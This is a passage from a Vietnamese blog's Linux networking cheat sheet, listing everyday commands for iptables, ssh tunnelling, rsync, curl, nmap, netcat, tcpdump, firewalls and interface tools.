</span></span><span class=line><span class=cl>ss <span class=s1>&#39;dport = :443&#39;</span>               <span class=c1># Filter by port</span></span></span></code></pre></div><h3 class=heading-element id=iptables><span>iptables</span>
<a href=#iptables class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>iptables -L -n                  <span class=c1># List rules</span>
</span></span><span class=line><span class=cl>iptables -A INPUT -p tcp --dport <span class=m>22</span> -j ACCEPT
</span></span><span class=line><span class=cl>iptables -A INPUT -m state --state ESTABLISHED -j ACCEPT
</span></span><span class=line><span class=cl>iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
</span></span><span class=line><span class=cl>iptables-save &gt; /etc/iptables/rules.v4</span></span></code></pre></div><h3 class=heading-element id=ssh><span>ssh</span>
<a href=#ssh class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh -L 3306:localhost:3306 user@server   <span class=c1># Local forward</span>
</span></span><span class=line><span class=cl>ssh -R 8080:localhost:80 user@server     <span class=c1># Remote forward</span>
</span></span><span class=line><span class=cl>ssh -D <span class=m>1080</span> user@server                  <span class=c1># SOCKS proxy</span>
</span></span><span class=line><span class=cl>ssh -J bastion user@target               <span class=c1># Jump host</span></span></span></code></pre></div><h3 class=heading-element id=rsync><span>rsync</span>
<a href=#rsync class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>rsync -avz /src/ user@server:/dst/
</span></span><span class=line><span class=cl>rsync -avP --delete /src/ /dst/          <span class=c1># Mirror</span>
</span></span><span class=line><span class=cl>rsync --exclude<span class=o>=</span><span class=s1>&#39;*.log&#39;</span> -av /src/ /dst/</span></span></code></pre></div><h3 class=heading-element id=curl><span>curl</span>
<a href=#curl class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -v https://example.com              <span class=c1># Verbose</span>
</span></span><span class=line><span class=cl>curl -X POST -d <span class=s1>&#39;{&#34;key&#34;:&#34;value&#34;}&#39;</span> -H <span class=s2>&#34;Content-Type: application/json&#34;</span> URL
</span></span><span class=line><span class=cl>curl -u user:pass URL                    <span class=c1># Basic auth</span>
</span></span><span class=line><span class=cl>curl -L URL                              <span class=c1># Follow redirects</span></span></span></code></pre></div><h3 class=heading-element id=nmap><span>nmap</span>
<a href=#nmap class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nmap -sS -sV -O target                   <span class=c1># SYN scan + version + OS</span>
</span></span><span class=line><span class=cl>nmap -p- target                          <span class=c1># All ports</span>
</span></span><span class=line><span class=cl>nmap --script<span class=o>=</span>vuln target                <span class=c1># Vulnerability scan</span></span></span></code></pre></div><h3 class=heading-element id=nc-netcat><span>nc (netcat)</span>
<a href=#nc-netcat class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -zv host 1-1000                       <span class=c1># Port scan</span>
</span></span><span class=line><span class=cl>nc -l -p <span class=m>1234</span> &gt; file                     <span class=c1># Receive file</span>
</span></span><span class=line><span class=cl>nc host <span class=m>1234</span> &lt; file                      <span class=c1># Send file</span></span></span></code></pre></div><h3 class=heading-element id=digpingtraceroute><span>dig/ping/traceroute</span>
<a href=#digpingtraceroute class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>dig +short example.com                   <span class=c1># Quick DNS lookup</span>
</span></span><span class=line><span class=cl>dig @8.8.8.8 example.com                 <span class=c1># Specific DNS server</span>
</span></span><span class=line><span class=cl>ping -c <span class=m>4</span> host                           <span class=c1># 4 pings</span>
</span></span><span class=line><span class=cl>traceroute -n host                       <span class=c1># Trace path</span></span></span></code></pre></div><h3 class=heading-element id=nmcli><span>nmcli</span>
<a href=#nmcli class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nmcli device status                      <span class=c1># List devices</span>
</span></span><span class=line><span class=cl>nmcli connection show                    <span class=c1># List connections</span>
</span></span><span class=line><span class=cl>nmcli connection up <span class=s2>&#34;My Connection&#34;</span>      <span class=c1># Activate</span>
</span></span><span class=line><span class=cl>nmcli connection add <span class=nb>type</span> ethernet con-name eth ifname eth0 ipv4.method manual ipv4.addresses 192.168.1.10/24 ipv4.gateway 192.168.1.1
</span></span><span class=line><span class=cl>nmcli connection modify <span class=s2>&#34;eth&#34;</span> ipv4.dns <span class=s2>&#34;8.8.8.8&#34;</span>
</span></span><span class=line><span class=cl>nmcli device wifi list                   <span class=c1># Scan WiFi</span>
</span></span><span class=line><span class=cl>nmcli device wifi connect <span class=s2>&#34;SSID&#34;</span> password <span class=s2>&#34;pass&#34;</span></span></span></code></pre></div><h3 class=heading-element id=resolvectl><span>resolvectl</span>
<a href=#resolvectl class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>resolvectl status                        <span class=c1># DNS status</span>
</span></span><span class=line><span class=cl>resolvectl query google.com              <span class=c1># Query DNS</span>
</span></span><span class=line><span class=cl>resolvectl flush-caches                  <span class=c1># Flush DNS cache</span>
</span></span><span class=line><span class=cl>resolvectl dns eth0 8.8.8.8              <span class=c1># Set DNS for interface</span></span></span></code></pre></div><h3 class=heading-element id=tcpdump><span>tcpdump</span>
<a href=#tcpdump class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tcpdump -i eth0 -nn                      <span class=c1># Capture all</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 -nn <span class=s1>&#39;port 80&#39;</span>            <span class=c1># Filter by port</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 -nn <span class=s1>&#39;host 192.168.1.100&#39;</span> <span class=c1># Filter by host</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 -nn <span class=s1>&#39;tcp and port 443&#39;</span>   <span class=c1># Protocol + port</span>
</span></span><span class=line><span class=cl>tcpdump -i eth0 -w capture.pcap          <span class=c1># Save to file</span>
</span></span><span class=line><span class=cl>tcpdump -r capture.pcap                  <span class=c1># Read from file</span></span></span></code></pre></div><h3 class=heading-element id=firewall-cmd-rhelcentos><span>firewall-cmd (RHEL/CentOS)</span>
<a href=#firewall-cmd-rhelcentos class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>firewall-cmd --state                     <span class=c1># Status</span>
</span></span><span class=line><span class=cl>firewall-cmd --list-all                  <span class=c1># List rules</span>
</span></span><span class=line><span class=cl>firewall-cmd --add-service<span class=o>=</span>http --permanent
</span></span><span class=line><span class=cl>firewall-cmd --add-port<span class=o>=</span>8080/tcp --permanent
</span></span><span class=line><span class=cl>firewall-cmd --reload</span></span></code></pre></div><h3 class=heading-element id=ufw-ubuntu><span>ufw (Ubuntu)</span>
<a href=#ufw-ubuntu class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ufw status                               <span class=c1># Status</span>
</span></span><span class=line><span class=cl>ufw enable/disable                       <span class=c1># Toggle</span>
</span></span><span class=line><span class=cl>ufw allow <span class=m>22</span>                             <span class=c1># Allow port</span>
</span></span><span class=line><span class=cl>ufw allow from 192.168.1.0/24            <span class=c1># Allow network</span>
</span></span><span class=line><span class=cl>ufw deny <span class=m>3306</span>                            <span class=c1># Deny port</span>
</span></span><span class=line><span class=cl>ufw limit ssh                            <span class=c1># Rate limit</span></span></span></code></pre></div><h3 class=heading-element id=ethtool><span>ethtool</span>
<a href=#ethtool class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ethtool eth0                             <span class=c1># NIC info</span>
</span></span><span class=line><span class=cl>ethtool -i eth0                          <span class=c1># Driver info</span>
</span></span><span class=line><span class=cl>ethtool -S eth0                          <span class=c1># Statistics</span>
</span></span><span class=line><span class=cl>ethtool -s eth0 speed <span class=m>1000</span> duplex full   <span class=c1># Set speed</span></span></span></code></pre></div><h3 class=heading-element id=tc-traffic-control><span>tc (traffic control)</span>
<a href=#tc-traffic-control class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tc qdisc show dev eth0                   <span class=c1># Show qdisc</span>
</span></span><span class=line><span class=cl>tc qdisc add dev eth0 root tbf rate 1mbit burst 32kbit latency 400ms  <span class=c1># Rate limit</span>
</span></span><span class=line><span class=cl>tc qdisc add dev eth0 root netem delay 100ms                          <span class=c1># Add latency</span>
</span></span><span class=line><span class=cl>tc qdisc del dev eth0 root               <span class=c1># Remove</span></span></span></code></pre></div><h3 class=heading-element id=iw-wireless><span>iw (wireless)</span>
<a href=#iw-wireless class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>iw dev                                   <span class=c1># List wireless interfaces</span>
</span></span><span class=line><span class=cl>iw dev wlan0 link                        <span class=c1># Connection status</span>
</span></span><span class=line><span class=cl>iw dev wlan0 scan                        <span class=c1># Scan networks</span></span></span></code></pre></div></div><hr class=awesome-hr><h2 id=see-also>Nội dung liên quan</h2><ul><li><a href=/bai-viet/khoa-hoc-may-tinh/linux-cli/grep-diff-sort/ title="Grep, Sort, Diff - Hướng Dẫn Chuyên Sâu">Grep, Sort, Diff - Hướng Dẫn Chuyên Sâu</a></li><li><a href=/bai-viet/khoa-hoc-may-tinh/linux-cli/shell-co-ban/ title="Những Điều Cơ Bản Về Bash & Fish Shell Trong Linux">Những Điều Cơ Bản Về Bash & Fish Shell Trong Linux</a></li></ul><div class=collection-card><div class="collection-title text-secondary">Trong <a href=/collections/linux-cli/><i class="fa-solid fa-layer-group fa-fw" aria-hidden=true></i> <span>Bộ sưu tập・Linux Cli</span></span></a> 11</div><div class=collection-nav><a href=/bai-viet/khoa-hoc-may-tinh/linux-cli/grep-diff-sort/ class=collection-nav-item rel=prev title="Grep, Sort, Diff - Hướng Dẫn Chuyên Sâu"><i class="fa-solid fa-angle-left fa-fw" aria-hidden=true></i><span>Grep, Sort, Diff - Hướng Dẫn Chuyên Sâu</span>
</a><a href=/bai-viet/khoa-hoc-may-tinh/linux-cli/process-service-log/ class=collection-nav-item rel=next title="Process Management, Systemd & Logging - Hướng Dẫn Chuyên Sâu"><span>Process Management, Systemd & Logging - Hướng Dẫn Chuyên Sâu</span><i class="fa-solid fa-angle-right fa-fw" aria-hidden=true></i></a></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span title="Cập nhật ngày 2025-12-13 07:26:59">Cập nhật ngày 2025-12-13&nbsp;</span></div><div class=post-info-license><span><a rel="license external nofollow noopener noreferrer" href=https://creativecommons.org/licenses/by-nc-sa/4.0/ target=_blank>CC BY-NC-SA 4.0</a></span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="Chia sẻ trên X" data-sharer=twitter data-url=https://vanvuvuong.github.io/bai-viet/khoa-hoc-may-tinh/linux-cli/network/ data-title="Linux Network Commands - Hướng Dẫn Chuyên Sâu" data-hashtags="ai generated post"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); title="Chia sẻ trên Facebook" data-sharer=facebook data-url=https://vanvuvuong.github.io/bai-viet/khoa-hoc-may-tinh/linux-cli/network/ data-hashtag="ai generated post"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); title="Chia sẻ trên 微博" data-sharer=weibo data-url=https://vanvuvuong.github.io/bai-viet/khoa-hoc-may-tinh/linux-cli/network/ data-title="Linux Network Commands - Hướng Dẫn Chuyên Sâu"><i class="fa-brands fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fa-solid fa-tags fa-fw me-1" aria-hidden=true></i><a href=/tags/ai-generated-post/ class=post-tag title="Nhãn - Ai Generated Post">Ai Generated Post</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Quay lại</a></span>&nbsp;|&nbsp;<span><a href=/>Trang chủ</a></span></section></div><div class=post-nav><a href=/bai-viet/khoa-hoc-may-tinh/linux-cli/grep-diff-sort/ class=post-nav-item rel=prev title="Grep, Sort, Diff - Hướng Dẫn Chuyên Sâu"><i class="fa-solid fa-angle-left fa-fw" aria-hidden=true></i>Grep, Sort, Diff - Hướng Dẫn Chuyên Sâu</a><a href=/bai-viet/khoa-hoc-may-tinh/linux-cli/process-service-log/ class=post-nav-item rel=next title="Process Management, Systemd & Logging - Hướng Dẫn Chuyên Sâu">Process Management, Systemd & Logging - Hướng Dẫn Chuyên Sâu<i class="fa-solid fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article><aside class=toc id=toc-auto aria-label="Nội dung"><h2 class=toc-title>Nội dung&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden=true></i></h2><div class=toc-content id=toc-content-auto></div></aside><dialog id=toc-dialog aria-labelledby=toc-dialog-title role=dialog><div class=toc><h2 class=toc-title>Nội dung</h2><div class=toc-content id=toc-content-drawer><nav><ul><li><ul><li><a href=#phần-1-ip---quản-lý-network-interface>PHẦN 1: IP - QUẢN LÝ NETWORK INTERFACE</a><ul><li><a href=#11-kiến-trúc-network-stack>1.1 Kiến Trúc Network Stack</a></li><li><a href=#12-cú-pháp-ip-command>1.2 Cú Pháp ip Command</a></li></ul></li></ul></li><li><a href=#object-chính>OBJECT chính:</a></li><li><a href=#options-hay-dùng>OPTIONS hay dùng:</a><ul><li><ul><li><a href=#14-ip-addr---quản-lý-ip-address>1.4 ip addr - Quản Lý IP Address</a></li><li><a href=#15-ip-route---routing-table>1.5 ip route - Routing Table</a></li><li><a href=#16-ip-neigh---arp-cache>1.6 ip neigh - ARP Cache</a></li><li><a href=#17-network-namespaces>1.7 Network Namespaces</a></li></ul></li><li><a href=#phần-2-ssnetstat---socket-statistics>PHẦN 2: SS/NETSTAT - SOCKET STATISTICS</a><ul><li><a href=#21-tcp-connection-states>2.1 TCP Connection States</a></li><li><a href=#22-ss-vs-netstat>2.2 ss vs netstat</a></li><li><a href=#23-cú-pháp-ss>2.3 Cú Pháp ss</a></li><li><a href=#24-các-lệnh-hay-dùng>2.4 Các Lệnh Hay Dùng</a></li><li><a href=#25-filtering>2.5 Filtering</a></li><li><a href=#26-monitoring-use-cases>2.6 Monitoring Use Cases</a></li></ul></li><li><a href=#phần-3-iptables---firewall>PHẦN 3: IPTABLES - FIREWALL</a><ul><li><a href=#31-netfilter-architecture>3.1 Netfilter Architecture</a></li><li><a href=#32-rule-processing-algorithm>3.2 Rule Processing Algorithm</a></li><li><a href=#33-cú-pháp-cơ-bản>3.3 Cú Pháp Cơ Bản</a></li><li><a href=#34-targets-actions>3.4 Targets (Actions)</a></li><li><a href=#35-match-extensions>3.5 Match Extensions</a></li><li><a href=#36-stateful-firewall>3.6 Stateful Firewall</a></li><li><a href=#37-nat-network-address-translation>3.7 NAT (Network Address Translation)</a></li><li><a href=#38-ví-dụ-thực-tế>3.8 Ví Dụ Thực Tế</a></li><li><a href=#39-ipset---efficient-ip-lists>3.9 ipset - Efficient IP Lists</a></li></ul></li><li><a href=#phần-4-ssh---secure-shell>PHẦN 4: SSH - SECURE SHELL</a><ul><li><a href=#41-ssh-architecture>4.1 SSH Architecture</a></li><li><a href=#42-key-based-authentication>4.2 Key-Based Authentication</a></li><li><a href=#43-ssh-config-file>4.3 SSH Config File</a></li><li><a href=#44-port-forwarding-tunneling>4.4 Port Forwarding (Tunneling)</a></li><li><a href=#45-scp-và-sftp>4.5 SCP và SFTP</a></li><li><a href=#46-security-best-practices>4.6 Security Best Practices</a></li></ul></li><li><a href=#phần-5-rsync---remote-sync>PHẦN 5: RSYNC - REMOTE SYNC</a><ul><li><a href=#51-delta-algorithm>5.1 Delta Algorithm</a></li><li><a href=#52-cú-pháp-cơ-bản>5.2 Cú Pháp Cơ Bản</a></li><li><a href=#53-options-quan-trọng>5.3 Options Quan Trọng</a></li><li><a href=#54-ví-dụ-thực-tế>5.4 Ví Dụ Thực Tế</a></li><li><a href=#55-backup-strategy-với-rsync>5.5 Backup Strategy với Rsync</a></li></ul></li><li><a href=#phần-6-curl--wget>PHẦN 6: CURL & WGET</a><ul><li><a href=#61-curl---http-swiss-army-knife>6.1 Curl - HTTP Swiss Army Knife</a></li><li><a href=#62-wget---download-manager>6.2 Wget - Download Manager</a></li><li><a href=#63-curl-vs-wget>6.3 Curl vs Wget</a></li></ul></li><li><a href=#phần-7-nmap--nc-netcat>PHẦN 7: NMAP & NC (NETCAT)</a><ul><li><a href=#71-nmap---network-mapper>7.1 Nmap - Network Mapper</a></li><li><a href=#72-netcat-nc---tcpudp-swiss-army-knife>7.2 Netcat (nc) - TCP/UDP Swiss Army Knife</a></li></ul></li><li><a href=#phần-8-dns--network-diagnostics>PHẦN 8: DNS & NETWORK DIAGNOSTICS</a><ul><li><a href=#81-dns-resolution>8.1 DNS Resolution</a></li><li><a href=#82-dig---dns-query-tool>8.2 dig - DNS Query Tool</a></li><li><a href=#83-nslookup>8.3 nslookup</a></li><li><a href=#84-ping--traceroute>8.4 Ping & 